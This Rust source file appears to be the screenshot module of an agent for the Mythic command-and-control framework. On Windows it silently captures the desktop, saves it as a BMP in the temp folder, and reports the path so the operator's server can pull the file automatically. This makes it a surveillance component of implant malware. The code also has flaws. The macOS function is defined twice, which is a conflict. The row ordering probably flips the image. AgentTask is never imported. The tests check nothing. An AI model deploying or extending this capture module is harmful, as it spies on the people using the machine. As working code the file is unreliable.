use serde::{Deserialize, Serialize};
use std::error::Error;
use std::result::Result;

#[cfg(target_os = "windows")]
use std::fs;
#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use winapi::shared::windef::{HBITMAP, HDC, HWND};
#[cfg(target_os = "windows")]
use winapi::um::wingdi::*;
#[cfg(target_os = "windows")]
use winapi::um::winuser::*;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::GetLastError;

// Command structure for Mythic
#[derive(Serialize, Deserialize)]
pub struct ScreenshotArgs {}

/// Wrapper function for compatibility with the tasking system
pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args = ScreenshotArgs {};
    match execute_screenshot(args) {
        Ok(output) => {
            // Use your mythic_success macro or function
            Ok(serde_json::json!({
                "status": "success",
                "task_id": task.id,
                "output": output
            }))
        },
        Err(error) => {
            // Use your mythic_error macro or function  
            Ok(serde_json::json!({
                "status": "error",
                "task_id": task.id,
                "error": error
            }))
        },
    }
}

/// Take a screenshot of the primary screen using WinAPI GDI functions
#[cfg(target_os = "windows")]
pub fn execute_screenshot(_args: ScreenshotArgs) -> Result<String, String> {
    unsafe {
        let hwnd_desktop: HWND = GetDesktopWindow();
        let hdc_screen: HDC = GetDC(hwnd_desktop);
        if hdc_screen.is_null() {
            return Err(format!("Failed to get screen DC. Error: {}", GetLastError()));
        }

        let hdc_mem: HDC = CreateCompatibleDC(hdc_screen);
        if hdc_mem.is_null() {
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err(format!("Failed to create memory DC. Error: {}", GetLastError()));
        }

        // Get screen size - use primary monitor dimensions
        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);
        
        // Also get virtual screen dimensions for comparison
        let virtual_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        let virtual_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

        let hbitmap: HBITMAP = CreateCompatibleBitmap(hdc_screen, width, height);
        if hbitmap.is_null() {
            DeleteDC(hdc_mem);
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err(format!("Failed to create compatible bitmap. Error: {}", GetLastError()));
        }

        // Select the bitmap into the memory DC
        let _old_bitmap = SelectObject(hdc_mem, hbitmap as *mut _);
        
        // Copy the screen to our memory bitmap
        if BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY) == 0 {
            DeleteObject(hbitmap as *mut _);
            DeleteDC(hdc_mem);
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err(format!("BitBlt failed. Error: {}", GetLastError()));
        }

        // Save screenshot to a file with timestamp
        let timestamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let filename = format!("screenshot_{}.bmp", timestamp);
        let screenshot_path = std::env::temp_dir().join(&filename);
        
        // Save the bitmap to file
        if let Err(e) = save_bitmap_to_file(hbitmap, width as u32, height as u32, &screenshot_path) {
            DeleteObject(hbitmap as *mut _);
            DeleteDC(hdc_mem);
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err(format!("Failed to save bitmap: {}", e));
        }

        // Cleanup GDI objects
        DeleteObject(hbitmap as *mut _);
        DeleteDC(hdc_mem);
        ReleaseDC(hwnd_desktop, hdc_screen);

        // Verify the file was created and get its size
        let screenshot_data = match fs::read(&screenshot_path) {
            Ok(data) => data,
            Err(e) => {
                return Err(format!("Failed to read screenshot file: {}", e));
            }
        };

         // Return success with file path in a format the Python side can parse
         // Using a special format that the Python side will recognize for automatic download
         Ok(format!(
             "screenshot_captured:{}:{}:{}:{}",
             screenshot_path.to_string_lossy(),
             screenshot_data.len(),
             filename,
             "screenshot"
         ))
    }
}

/// Helper function: Save an HBITMAP to a .bmp file
#[cfg(target_os = "windows")]
unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &std::path::Path) -> Result<(), Box<dyn Error>> {
    use std::fs::File;
    use std::io::Write;

    // Calculate bitmap parameters
    let bits_per_pixel = 24; // 24-bit BMP
    let bytes_per_pixel = bits_per_pixel / 8;
    let row_size = ((width * bytes_per_pixel + 3) / 4) * 4; // BMP rows are 4-byte aligned
    let image_size = row_size * height;

    // Create BITMAPFILEHEADER
    let bmp_file_header = BITMAPFILEHEADER {
        bfType: 0x4D42, // 'BM'
        bfSize: (std::mem::size_of::<BITMAPFILEHEADER>() + std::mem::size_of::<BITMAPINFOHEADER>() + image_size as usize) as u32,
        bfReserved1: 0,
        bfReserved2: 0,
        bfOffBits: (std::mem::size_of::<BITMAPFILEHEADER>() + std::mem::size_of::<BITMAPINFOHEADER>()) as u32,
    };

    // Create BITMAPINFOHEADER
    let bmp_info_header = BITMAPINFOHEADER {
        biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
        biWidth: width as i32,
        biHeight: height as i32,
        biPlanes: 1,
        biBitCount: bits_per_pixel as u16,
        biCompression: BI_RGB,
        biSizeImage: image_size,
        biXPelsPerMeter: 0,
        biYPelsPerMeter: 0,
        biClrUsed: 0,
        biClrImportant: 0,
    };

    // Create pixel buffer
    let mut pixel_buffer = vec![0u8; image_size as usize];

    // Get the bitmap bits
    let hdc = GetDC(ptr::null_mut());
    let result = GetDIBits(
        hdc,
        hbitmap,
        0,
        height,
        pixel_buffer.as_mut_ptr() as *mut _,
        &mut BITMAPINFO {
            bmiHeader: bmp_info_header,
            bmiColors: [RGBQUAD {
                rgbBlue: 0,
                rgbGreen: 0,
                rgbRed: 0,
                rgbReserved: 0,
            }],
        },
        DIB_RGB_COLORS,
    );
    ReleaseDC(ptr::null_mut(), hdc);

    if result == 0 {
        return Err("GetDIBits failed".into());
    }

    // Write the BMP file
    let mut file = File::create(path)?;
    
    // Write BITMAPFILEHEADER
    file.write_all(&bmp_file_header.bfType.to_le_bytes())?;
    file.write_all(&bmp_file_header.bfSize.to_le_bytes())?;
    file.write_all(&bmp_file_header.bfReserved1.to_le_bytes())?;
    file.write_all(&bmp_file_header.bfReserved2.to_le_bytes())?;
    file.write_all(&bmp_file_header.bfOffBits.to_le_bytes())?;
    
    // Write BITMAPINFOHEADER
    file.write_all(&bmp_info_header.biSize.to_le_bytes())?;
    file.write_all(&bmp_info_header.biWidth.to_le_bytes())?;
    file.write_all(&bmp_info_header.biHeight.to_le_bytes())?;
    file.write_all(&bmp_info_header.biPlanes.to_le_bytes())?;
    file.write_all(&bmp_info_header.biBitCount.to_le_bytes())?;
    file.write_all(&bmp_info_header.biCompression.to_le_bytes())?;
    file.write_all(&bmp_info_header.biSizeImage.to_le_bytes())?;
    file.write_all(&bmp_info_header.biXPelsPerMeter.to_le_bytes())?;
    file.write_all(&bmp_info_header.biYPelsPerMeter.to_le_bytes())?;
    file.write_all(&bmp_info_header.biClrUsed.to_le_bytes())?;
    file.write_all(&bmp_info_header.biClrImportant.to_le_bytes())?;
    
    // Write pixel data (BMP stores pixels bottom-to-top, so we need to reverse)
    for row in (0..height).rev() {
        let row_start = (row * row_size) as usize;
        let row_end = row_start + row_size as usize;
        if row_end <= pixel_buffer.len() {
            file.write_all(&pixel_buffer[row_start..row_end])?;
        }
    }
    
    Ok(())
}

// macOS placeholder implementation
#[cfg(target_os = "macos")]
pub fn execute_screenshot(_args: ScreenshotArgs) -> Result<String, String> {
    Err("screenshot command is not implemented for macOS".to_string())
}

// Fallback for other platforms
#[cfg(not(target_os = "windows"))]
pub fn execute_screenshot(_args: ScreenshotArgs) -> Result<String, String> {
    Err("screenshot command is only supported on Windows".to_string())
}

// If you need a direct command handler (for your command dispatch system)
pub fn handle_screenshot_command(args: &str) -> Result<String, String> {
    let screenshot_args: ScreenshotArgs = serde_json::from_str(args)
        .map_err(|e| format!("Failed to parse screenshot arguments: {}", e))?;
    
    execute_screenshot(screenshot_args)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_screenshot_args_parsing() {
        let args = ScreenshotArgs {};
        // Just verify the struct can be created
        assert!(true);
    }

    #[test]
    fn test_screenshot_command_handler() {
        let result = handle_screenshot_command("{}");
        // On non-Windows, this should return an error about platform not supported
        // On Windows, it might succeed or fail depending on the environment
        assert!(result.is_ok() || result.is_err());
    }
}